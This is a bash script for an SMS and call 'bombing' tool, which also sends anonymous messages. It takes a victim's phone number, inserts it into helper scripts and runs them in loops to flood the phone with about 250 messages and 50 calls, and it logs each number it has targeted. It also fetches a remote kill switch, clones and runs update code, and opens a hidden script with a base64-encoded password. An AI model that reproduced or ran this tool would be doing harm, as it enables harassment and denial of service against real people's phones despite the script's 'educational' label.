#!/bin/bash

#------------------------------------------------------#
#                  BOMB & ANONY SMS !!!                #
#               Coded by Mr.WhiteHatBAWA               #
#~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ #
#      Github     :   github.com/MrWhieHatBAWA         #
#     Telegram    :   https://t.me/mrwhitehatbawa      #
#------------------------------------------------------#
#               Come an get it from HERE !!!           #
#------------------------------------------------------#

# Colors FG

RED="$(printf '\e[31m')"
GREEN="$(printf '\e[32m')"
ORANGE="$(printf '\e[33m')"
BLUE="$(printf '\e[34m')"
MAGENTA="$(printf '\e[35m')"
CYAN="$(printf '\e[36m')"
WHITE="$(printf '\e[37m')"
BLACK="$(printf '\e[30m')"

clear
just() {
clear
echo ""
echo ""
printf  "                      \e[1;33m|C|O|N|N|E|C|T|E|D| |T|O| |I|N|T|E|R|N|E|T|"
echo ""
echo ""
echo ""
}


banner() {

echo -e ""
echo "          $GREEN   _______   _______   __      __   ________         __     _________   __      __      _________                                           "
echo "          $WHITE  |  ___  | |  ___  | |  \    /  | |  ___   |      /  /    / /_______/ |  \    /  |    / /_______/                        "
echo "          $GREEN  | |___| | | |   | | | |\\__//| | | |___|  |     /  /    / /________  | |\\__//| |   / /_______                                  "
echo "          $WHITE  |  ___ |  | |   | | | | \__/ | | |  ___  |     /  /    /_/______/_/  | | \__/ | |  /_/______/_/                   "
echo "          $GREEN  | |___| | | |___| | | |      | | | |___|  |   /  /     ________/_/   | |      | |  ________/_/       "
echo "          $GREEN  |_______| |_______| |_|      |_| |________|  /__/     /_______/_/    |_|      |_| /_________/                                    "
echo "         $MAGENTA                                                                                                          "
sleep 1
echo "                                    $GREEN Author:$RED Mr.WhiteHatBAWA"
echo ""

}

#    Check Internet
wget -q --spider https://github.com/MrWhieHatBAWA

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    banner
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Internet is unavailable  !!!\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect to internet and try !!!\e[93m"
    echo ""
    echo ""
    exit
fi

rm .server.txt > /dev/null 2>&1
wget -L https://raw.githubusercontent.com/anubhavanonymous/serverxlr8/main/.server.txt > /dev/null 2>&1
serverup="On"
server=$(cat .server.txt | grep On)
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo ""
sleep 1                       
echo "              $GREEN     __ _____________   _____________    _____________   _____________   _____________                                                                                        " 
echo "              $CYAN     |  |_____________| |   _______   |  |   _______   | |   _______   | |   _______   |    404  404  404  404                                            "
echo "              $GREEN    |  |               |  |       |  |  |  |       |  | |  |       |  | |  |       |  |    404  404  404  404                         "
echo "              $CYAN     |  |_________      |  |_______|  |  |  |_______|  | |  |       |  | |  |_______|  |    404  404  404  404                              "
echo "              $GREEN    |  |_________|     |   __________|  |   __________| |  |       |  | |   __________|    404404404404404404                      "
echo "              $CYAN     |  |               |  |    \ \      |  |    \ \     |  |       |  | |  |    \ \        404  404  404  404                          "
echo "              $GREEN    |  |_____________  |  |      \ \    |  |      \ \   |  |_______|  | |  |      \ \      404  404  404  404                                          "
echo "              $CYAN     |__|_____________| |__|        \_\  |__|        \_\ |_____________| |__|        \_\    404  404  404  404                                                  " 
echo "                                                                                                                                            "
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer !" | pv -qL 30
echo ""
exit
exit
exit
fi

updatee() {
clear
echo -e "\e[92m "
clear
echo ""
echo "      $CYAN      ▀ ▀  █▀█  █▀▄  ▄▀█  ▀█▀  █▀▀  █▀▄                                                               "
echo "      $GREEN     █▄█  █▀▀  █▄▀  █▀█  ░█░  ██▄  █▄▀                                                              "
echo ""
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[0m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "      \e[92m[\e[93m~\e[92m]\e[36m Updating Now...\e[93m"
sleep 2
echo ""
cd ..
rm -rf BOMB&SMS
git clone https://github.com/MrWhieHatBAWA/BOMBER-SMS-Anony.git > /dev/null 2>&1
cd BOMBER-SMS-Anony
chmod +x BOMB&ANONY.sh
clear
echo ""
echo "       $GREEN █░█ █▀█ █▀▄ ▄▀█ ▀█▀ █▀▀ █▀▄"
echo "       $CYAN  █▄█ █▀▀ █▄▀ █▀█ ░█░ ██▄ █▄▀ "
echo ""
sleep 3
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarted BOMB&SMS !\e[93m"
sleep 2
bash xlr8.sh
}


bombrecord() {
clear
echo "$GREEN                                        ______           ______                          "
echo "$WHITE       █▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ 　   █   █____    █▀▄▀█  █____                           "
echo "$GREEN       █▀▀▄ █░░█ █░▀░█ █▀▀▄ 　   █   █____█   █░▀░█  █____█                "
echo "$WHITE       █▄▄█ ▀▀▀▀ ▀    ▀ ▀▀▀  　   █   _____█   █   █   _____█              "
echo ""
echo ""
echo -e "     \e[92m[\e[36m~\e[92m]\e[93m This is a record of numbers which had been bombed !\e[93m" | pv -qL 30
echo " $GREEN"
cat .bombrecord.txt
exit
}

PW_WD=$(pwd)
cd 'New Folder'
cp headapissl $PW_WD
cp tailapissl $PW_WD
cp anonapisl $PW_WD
cd ..

SECRET=VmtjMWQyTnJNSGROVlZab1pXdGFUMVZyV2tkT2JGSjFXa2hhVVZWWE9EbERaejA5Q2c9PQo=
for i in {1..5}
do SECRET=$(echo $SECRET | base64 --decode)
done


about() {
clear
echo -e '''
         \e[1;91m      ╔═══════════╗
         \e[1;91m    ╔═╝\e[1;97m███████████\e[1;91m╚═╗
         \e[1;91m   ╔╝\e[1;97m███████████████\e[1;91m╚╗
         \e[1;91m   ║\e[1;97m█████\e[1;92m4NU8H4V\e[1;97m█████\e[1;91m║
         \e[1;91m   ║\e[1;97m██████SMS█BOMB████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█████████████████\e[1;91m║\e[1;91m
         \e[1;91m   ║\e[1;97m█\e[1;91m╔\e[1;97m█████████████\e[1;91m╗\e[1;97m█\e[1;91m║\e[1;91m
         \e[1;91m   ╚╦╝\e[1;97m███\e[1;90m▒▒\e[1;97m███\e[1;90m BOMB\e[1;97m███\e[1;91m╚╦╝\e[1;91m
         \e[1;91m   ╔╝\e[1;97m██\e[1;90m SMS\e[1;97m███\e[1;90m SMS\e[1;97m██\e[1;91m╚╗\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90mBOMB\e[1;97m███\e[1;90m ANONY\e[1;97m██\e[1;91m|\e[1;91m
         \e[1;91m   ║\e[1;97m██\e[1;90m▒▒▒▒\e[1;97m█████\e[1;90m BOMB\e[1;97m██\e[1;91m║\e[1;94m
         \e[1;91m   ╚╗\e[1;97m███████████████\e[1;91m╔╝\e[1;94m
         \e[1;91m  ╔═╬══╦╝\e[1;97m██\e[1;90m▒\e[1;97m█\e[1;90m▒\e[1;97m██\e[1;91m╚╦══╝\e[1;90m .▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█████████\e[1;91m║\e[1;90m ...▒.       \e[1;93m
         \e[1;91m  ║\e[1;97m█\e[1;91m║══║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║\e[1;90m　.▒..
         \e[1;91m  ║\e[1;97m█\e[1;91m║══╚═╩══╩╦═╩═╩═╦╗\e[1;90m▒.
         \e[1;91m ╔╝\e[1;97m█\e[1;91m╚══╦═╦══╦╩═╦═╦═╩╝  \e[38;5;48m
         \e[1;91m╔╝\e[1;97m█████\e[1;91m║\e[1;97m█\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m██\e[1;91m║\e[1;97m█\e[1;91m║
         \e[1;91m║\e[1;97m██████\e[1;91m║\e[1;97m█████████\e[1;91m║
''' | pv -qL 300
sleep 1.2
echo -e "                                  This is\e[1;0m MRWhiteHatBAWA" | pv -qL 150
echo "                                    SMS BOMBING & ANONY SMS  ! ! !" | pv -qL 150
echo ""
echo -e "     $GREEN  PENTESTER $WHITE |$GREEN WHITEHAT-HOLDER$WHITE |$GREEN GUARDIAN" | pv -qL 10
echo ""
printf "\e[0m\e[92m                 Group Admin at$WHITE V.I.P. Hakz\e[0m\n" | pv -qL 12
echo ""
echo "       $MAGENTA          My social medias,!!" | pv -qL 10
echo ""
printf "\e[0m\e[92m          Github \e[0m\e[91m     :    \e[0m\e[96mgithub.com/MrWhieHatBAWA\e[0m\n" | pv -qL 50
echo ""
printf "\e[0m\e[92m         Telegram \e[0m\e[91m   :   \e[0m\e[96mhttps://t.me/mrwhitehatbawa\e[0m\n" | pv -qL 50
echo ""
echo -e "\e[1;91m                        Happy Bombing :)" | pv -qL 10
sleep 7
menux
}

eexec() {
echo "Under construction"
exit
}

menu() {
clear
echo ""
echo "        $GREEN  █▄▄ █▀█ █▀▄▀█ █▄▄ █ █▄░█ █▀▀"
echo "          $RED   █▄█ █▄█ █░▀░█ █▄█ █ █░▀█ █▄█"
echo ""
echo ""
printf "             \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read targett
if [[ $targett = $SECRET ]]
then
bash .notyourbusiness.sh
else
printf "\n"
echo ""
Date=$(date)
echo -e "      $targett was bombed on $Date"  >> .bombrecord.txt
printf "  $RED                     ░░░░░░███████ ]▄▄▄▄▄▄▄▄▃\n"
printf "  $WHITE                      ▂▄▅███\e[1;31mSMSBOMB\e[1;0m███▅▄▃▂\n"
printf "  $RED                    I███████████████████]\n"
printf "  $WHITE                      ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...\n"
echo ""
printf "             ~~~\e[1;92m Attack Started On +94$targett \e[0m~~~"
sleep 1
echo ""
echo ""
printf "\n"
printf "   Press ctrl+c to quit ! \n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
echo ""

while read a; do
    echo ${a//€shushhi/$targett}
done < headapissl > headapissl.t
mv headapissl{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapissl > tailapissl.t
mv tailapissl{.t,}

for i in {1..4}
do bash headapissl
done

for i in {1..27}
do bash tailapissl
done

exit 
fi
}


anonmsg(){
clear
echo ""

echo "     $RED   ▄▀█ █▄░█ █▀█ █▄░█ █▄█ █▀▄▀█ █▀█ █░█ █▀   █▀▄▀█ █▀ █▀▀"
echo "     $WHITE █▀█ █░▀█ █▄█ █░▀█ ░█░ █░▀░█ █▄█ █▄█ ▄█   █░▀░█ ▄█ █▄█"
echo ""
echo ""
printf "      \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m"
read smstarget
echo ""
printf "      \e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m"
read text
echo ""

while read a; do
    echo ${a//₹axx/$smstarget}
done < anonapisl > anonapisl.t
mv anonapisl{.t,}
while read a; do
    echo ${a//€amsg/$text}
done < anonapisl > anonapisl.t
mv anonapisl{.t,}
bash anonapisl > records.txt
value=$( grep -o "true" records.txt)
if [[ $value = "true" ]]
then
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
exit
else
echo ""
printf "   \e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 ! $RED BE HAPPY\e[0m\n"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "   \e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
exit
fi
}


menux() {
clear
clear
banner
sleep 1
DATE=$(date)
echo "$WHITE✯ Started on $RED$DATE"
echo "$WHITE------------------------------"
printf "\e[1;33m⚡ This tool is only for Educational Purposes !!\e[0m\n"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;33m MASS BOMBING \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;33m ANONYMOUS MSG \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;33m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;33m ABOUT \e[0m\n"
printf "\e[1;92m[\e[0m 5\e[1;92m ]\e[0m>>>\e[1;33m QUIT \e[0m\n"
echo ""
printf "\e[1;31m Select Option !! \e[0m−−⋙⋙⋙ "
read options
if [ "$options" -eq "0" ];then
        bombrecord
fi
if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi
if [ "$options" -eq "4" ];then
        about
fi
if [ "$options" -eq "007" ];then
        eexec
fi
if [ "$options" -eq "5" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using BOMB&ANONY !\e[93m"
        echo ""
        exit
else
        menux
fi


}
menux
